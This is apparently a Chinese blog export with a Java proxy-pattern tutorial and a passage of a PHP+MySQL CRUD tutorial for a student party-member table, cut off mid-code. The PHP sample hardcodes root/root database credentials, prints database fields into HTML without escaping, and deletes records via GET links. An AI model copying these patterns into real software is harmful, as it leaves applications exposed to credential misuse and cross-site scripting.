<p>自己是一个商人，在外地经商，由于人生地不熟，需要找个代理人给自己翻译，而代理人在为你工作的过程中 可以为做一些自己事情，但是每次都会完成你交给的任务，商人就是委托类，代理人就是代理类。</p>
<p>代理模式有静态代理和动态代理两种实现方式，我们 先来看一下静态代理模式的实现。</p>
<h2 id="2静态代理"><a href="#2静态代理" class="headerlink" title="2静态代理"></a>2静态代理</h2><p><strong>静态代理中，我们对目标对象的每个方法的增强都是手动完成的（*后面会具体演示代码*），非常不灵活（*比如接口一旦新增加方法，目标对象和代理对象都要进行修改*）且麻烦(*需要对每个目标类都单独写一个代理类*）。</strong> 实际应用场景非常非常少，日常开发几乎看不到使用静态代理的场景。</p>
<p>上面我们是从实现和应用角度来说的静态代理，从 JVM 层面来说， <strong>静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。</strong></p>
<hr>
<p><strong>1.定义发送短信的接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    String <span class="title function_">send</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.实现发送短信的接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.创建代理类并同样实现发送短信的接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsProxy</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SmsService smsService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SmsProxy</span><span class="params">(SmsService smsService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.smsService = smsService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="comment">//调用方法之前，我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method send()&quot;</span>);</span><br><span class="line">        smsService.send(message);</span><br><span class="line">        <span class="comment">//调用方法之后，我们同样可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method send()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>4.实际使用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>();</span><br><span class="line">        <span class="type">SmsProxy</span> <span class="variable">smsProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsProxy</span>(smsService);</span><br><span class="line">        smsProxy.send(<span class="string">&quot;java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行上述代码之后，控制台打印出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">before method send()</span><br><span class="line">send message:java</span><br><span class="line">after method send()</span><br></pre></td></tr></table></figure>

<p>可以输出结果看出，我们已经增加了 <code>SmsServiceImpl</code> 的<code>send()</code>方法。</p>
<h2 id="3-动态代理"><a href="#3-动态代理" class="headerlink" title="3.动态代理"></a>3.动态代理</h2><hr>
<p><strong>从 JVM 角度来说，动态代理是在运行时动态生成类字节码，并加载到 JVM 中的。</strong></p>
<p>说到动态代理，Spring AOP、RPC 框架应该是两个不得不提的，它们的实现都依赖了动态代理。</p>
<p>就 Java 来说，动态代理的实现方式有很多种，比如 <strong>JDK 动态代理</strong>、<strong>CGLIB 动态代理</strong>等等。</p>
<h3 id="3-1-JDK-动态代理机制"><a href="#3-1-JDK-动态代理机制" class="headerlink" title="3.1. JDK 动态代理机制"></a>3.1. JDK 动态代理机制</h3><h4 id="3-1-1-介绍"><a href="#3-1-1-介绍" class="headerlink" title="# 3.1.1. 介绍"></a><a href="#_3-1-1-%E4%BB%8B%E7%BB%8D">#</a> 3.1.1. 介绍</h4><p><strong>在 Java 动态代理机制中 <code>InvocationHandler</code> 接口和 <code>Proxy</code> 类是核心。</strong></p>
<p><code>Proxy</code> 类中使用频率最高的方法是：<code>newProxyInstance()</code> ，这个方法主要用来生成一个代理对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span><br><span class="line"><span class="params">                                      Class&lt;?&gt;[] interfaces,</span></span><br><span class="line"><span class="params">                                      InvocationHandler h)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalArgumentException</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法一共有 3 个参数：</p>
<ol>
<li><strong>loader</strong> :类加载器，用于加载代理对象。</li>
<li><strong>interfaces</strong> : 被代理类实现的一些接口；</li>
<li><strong>h</strong> : 实现了 <code>InvocationHandler</code> 接口的对象；</li>
</ol>
<p>要实现动态代理的话，还必须需要实现<code>InvocationHandler</code> 来自定义处理逻辑。 当我们的动态代理对象调用一个方法时，这个方法的调用就会被转发到实现<code>InvocationHandler</code> 接口类的 <code>invoke</code> 方法来调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当你使用代理对象调用方法的时候实际会调用到这个方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>invoke()</code> 方法有下面三个参数：</p>
<ol>
<li><strong>proxy</strong> :动态生成的代理类</li>
<li><strong>method</strong> : 与代理类对象调用的方法相对应</li>
<li><strong>args</strong> : 当前 method 方法的参数</li>
</ol>
<p>也就是说：<strong>你通过<code>Proxy</code> 类的 <code>newProxyInstance()</code> 创建的代理对象在调用方法的时候，实际会调用到实现<code>InvocationHandler</code> 接口的类的 <code>invoke()</code>方法。</strong> 你可以在 <code>invoke()</code> 方法中自定义处理逻辑，比如在方法执行前后做什么事情。</p>
<h4 id="3-1-2-JDK-动态代理类使用步骤"><a href="#3-1-2-JDK-动态代理类使用步骤" class="headerlink" title="# 3.1.2. JDK 动态代理类使用步骤"></a><a href="#_3-1-2-jdk-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%AA%A4">#</a> 3.1.2. JDK 动态代理类使用步骤</h4><ol>
<li>定义一个接口及其实现类；</li>
<li>自定义 <code>InvocationHandler</code> 并重写<code>invoke</code>方法，在 <code>invoke</code> 方法中我们会调用原生方法（被代理类的方法）并自定义一些处理逻辑；</li>
<li>通过 <code>Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</code> 方法创建代理对象；</li>
</ol>
<h4 id="3-1-3-代码示例"><a href="#3-1-3-代码示例" class="headerlink" title="# 3.1.3. 代码示例"></a><a href="#_3-1-3-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B">#</a> 3.1.3. 代码示例</h4><p>这样说可能会有点空洞和难以理解，我上个例子，大家感受一下吧！</p>
<p><strong>1.定义发送短信的接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    String <span class="title function_">send</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.实现发送短信的接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.定义一个 JDK 动态代理类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> shuang.kou</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@createTime</span> 2020年05月11日 11:23:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DebugInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代理类中的真实对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DebugInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//调用方法之前，我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        <span class="comment">//调用方法之后，我们同样可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>invoke()</code> 方法: 当我们的动态代理对象调用原生方法的时候，最终实际上调用到的是 <code>invoke()</code> 方法，然后 <code>invoke()</code> 方法代替我们去调用了被代理对象的原生方法。</p>
<p><strong>4.获取代理对象的工厂类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdkProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(), <span class="comment">// 目标类的类加载</span></span><br><span class="line">                target.getClass().getInterfaces(),  <span class="comment">// 代理需要实现的接口，可指定多个</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">DebugInvocationHandler</span>(target)   <span class="comment">// 代理对象对应的自定义 InvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getProxy()</code> ：主要通过<code>Proxy.newProxyInstance（）</code>方法获取某个类的代理对象</p>
<p><strong>5.实际使用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> (SmsService) JdkProxyFactory.getProxy(<span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>());</span><br><span class="line">smsService.send(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>运行上述代码之后，控制台打印出：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">before method send</span><br><span class="line">send message:java</span><br><span class="line">after method send</span><br></pre></td></tr></table></figure>

<hr>
<p>原文链接：<a href="https://javaguide.cn/java/basis/proxy.html">https://javaguide.cn/java/basis/proxy.html</a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql总结</title>
    <url>/2023/04/02/mysql%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>php+mysql实现增删改查功能</title>
    <url>/2023/03/21/php-mysql%E5%AE%9E%E7%8E%B0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<h2 id="1-建立数据库"><a href="#1-建立数据库" class="headerlink" title="1.建立数据库"></a>1.建立数据库</h2><p>本地数据库 root</p>
<p>用户 root</p>
<p>密码 root</p>
<p>数据库名 student</p>
<p>student数据库数据类型及名称</p>
<img src="/2023/03/21/php-mysql%E5%AE%9E%E7%8E%B0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E5%8A%9F%E8%83%BD/image-20230321143157479.png" class="" title="image-20230321143157479">



<p>student数据库中存在memberinfo用来存储党员信息</p>
<p>sql文件</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 示例：创建一个名为student的数据库，字符集为utf8。</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> student <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 示例：指定当前数据库为student,创建一个数据表</span></span><br><span class="line">USE student; </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `memberinfo` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT,</span><br><span class="line">  `mebID` <span class="type">varchar</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">  `mebName` <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">  `mebSex` <span class="type">varchar</span>(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;性别&#x27;</span>,</span><br><span class="line">  `mebClass` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;班级&#x27;</span>,</span><br><span class="line">  `mebAddDate` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;入党时间&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `memberinfo`(mebID,mebName,mebSex,mebClass,mebAddDate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;20181621&#x27;</span>,<span class="string">&#x27;张方&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="string">&#x27;计科1班&#x27;</span>,<span class="string">&#x27;2018-05-25&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;20171131&#x27;</span>,<span class="string">&#x27;杜云&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="string">&#x27;计科1班&#x27;</span>,<span class="string">&#x27;2018-05-25&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;20171135&#x27;</span>,<span class="string">&#x27;张凤&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="string">&#x27;计科1班&#x27;</span>,<span class="string">&#x27;2019-06-15&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;20171157&#x27;</span>,<span class="string">&#x27;王亮&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;计科1班&#x27;</span>,<span class="string">&#x27;2019-06-15&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;20171240&#x27;</span>,<span class="string">&#x27;李军&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;计科2班&#x27;</span>,<span class="string">&#x27;2019-05-23&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;20181266&#x27;</span>,<span class="string">&#x27;王欣&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;计科2班&#x27;</span>,<span class="string">&#x27;2019-05-23&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;20181330&#x27;</span>,<span class="string">&#x27;张军&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;计科3班&#x27;</span>,<span class="string">&#x27;2019-06-15&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">desc</span> memberinfo;</span><br><span class="line">#查看详细的列名</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">full</span> columns <span class="keyword">from</span> memberinfo;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> memberinfo;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 示例：将member表中学号为“20181623”的姓名改为“魏方”。</span></span><br><span class="line"><span class="keyword">UPDATE</span> memberinfo </span><br><span class="line"><span class="keyword">SET</span> mebName<span class="operator">=</span><span class="string">&#x27;王锋&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> mebId<span class="operator">=</span><span class="string">&#x27;20181330&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 示例：查询表中姓名为“王欣”的信息。</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> memberinfo <span class="keyword">WHERE</span> mebName<span class="operator">=</span><span class="string">&#x27;王欣&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建一个成绩表grade，student </span></span><br><span class="line">use student;</span><br><span class="line"><span class="comment">-- 成绩表的结构 ，包含学号，数学 ，英语</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> grade(`mebID` <span class="type">varchar</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,`math` <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">null</span>,`english` <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看表的结构</span></span><br><span class="line"><span class="keyword">desc</span> grade;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">full</span> columns <span class="keyword">from</span> memberinfo;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 插入一行数据 20181031 </span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `grade`(mebID,math,english) <span class="keyword">values</span>(<span class="string">&#x27;20181031&#x27;</span>,<span class="number">90</span>,<span class="number">81</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询表中所有的数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询党员信息表中，计科一班的学生</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询党员信息表中，模糊查询</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询 成绩表  信息表  数学成绩是100分的学生姓名  student数据库下，各个表之间有关联的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询查询表中所有的数据，只输出 前2行的数据 ，如何 实现  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 更新 </span></span><br><span class="line"><span class="keyword">update</span> memberinfo <span class="keyword">set</span> mebName<span class="operator">=</span><span class="string">&#x27;张三&#x27;</span> <span class="keyword">where</span> mebID<span class="operator">=</span><span class="string">&#x27;20181621&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">-- 删除</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> <span class="comment">-- 权限  mysql -u root -p   </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">--低权限   student  创建一个账户  stu  select ,insert ,delete  update  </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="2-实现数据库的增删改查"><a href="#2-实现数据库的增删改查" class="headerlink" title="2.实现数据库的增删改查"></a>2.实现数据库的增删改查</h2><img src="/2023/03/21/php-mysql%E5%AE%9E%E7%8E%B0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E5%8A%9F%E8%83%BD/image-20230321143315592.png" class="" title="image-20230321143315592">



<h3 id="1首先连接数据库"><a href="#1首先连接数据库" class="headerlink" title="1首先连接数据库"></a>1首先连接数据库</h3><p>mysql.php</p>
<p>代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//数据库连接信息</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&#x27;student&#x27;</span>;</span><br><span class="line"><span class="variable">$charset</span>=<span class="string">&quot;utf-8&quot;</span>;</span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line">@<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>, <span class="variable">$user</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="comment">//检查连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_set_charset</span>(<span class="variable">$conn</span>,<span class="variable">$charset</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="2-构造index-php作为默认页面"><a href="#2-构造index-php作为默认页面" class="headerlink" title="2.构造index.php作为默认页面"></a>2.构造index.php作为默认页面</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;cn&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;学生党员信息&lt;/title&gt;</span><br><span class="line">    &lt;!-- 加载 Bootstrap 的 CSS 文件 --&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/4.6.2/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 jQuery JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 Popper JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/popper.js/1.16.0/umd/popper.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 Bootstrap 的 JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/4.6.2/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;query.php?mebID=&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;keyWord&quot;</span> placeholder=<span class="string">&quot;请输入查询关键字&quot;</span></span><br><span class="line">           value=<span class="string">&quot;&lt;?php isset(<span class="subst">$keyWord</span>) ? <span class="subst">$keyWord</span>:&#x27;&#x27; ?&gt;&quot;</span> &gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;搜索&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;table <span class="class"><span class="keyword">class</span>=&quot;<span class="title">table</span> <span class="title">table</span>-<span class="title">dark</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">thead</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">th</span> <span class="title">scope</span>=&quot;<span class="title">col</span>&quot;&gt;学号&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">th</span> <span class="title">scope</span>=&quot;<span class="title">col</span>&quot;&gt;姓名&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">th</span> <span class="title">scope</span>=&quot;<span class="title">col</span>&quot;&gt;性别&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">th</span> <span class="title">scope</span>=&quot;<span class="title">col</span>&quot;&gt;班级&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">th</span> <span class="title">scope</span>=&quot;<span class="title">col</span>&quot;&gt;入党时间&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">thead</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">tbody</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;学生党员信息&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    <span class="title">include</span> &quot;<span class="title">link</span>.<span class="title">php</span>&quot;;</span></span><br><span class="line"><span class="class">    <span class="title">foreach</span>($<span class="title">dataArr</span> <span class="title">as</span> $<span class="title">row</span>)</span>&#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span> <span class="variable">$row</span>[<span class="string">&quot;mebID&quot;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span> <span class="variable">$row</span>[<span class="string">&quot;mebName&quot;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span> <span class="variable">$row</span>[<span class="string">&quot;mebSex&quot;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span> <span class="variable">$row</span>[<span class="string">&quot;mebClass&quot;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span> <span class="variable">$row</span>[<span class="string">&quot;mebAddDate&quot;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;a href=<span class="string">&quot;del.php?mebID=&lt;?php echo <span class="subst">$row</span>[&#x27;mebID&#x27;]?&gt;&quot;</span> onclick=<span class="string">&quot;del()&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">danger</span>&quot;&gt;删除&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">edit</span>.<span class="title">php</span>?<span 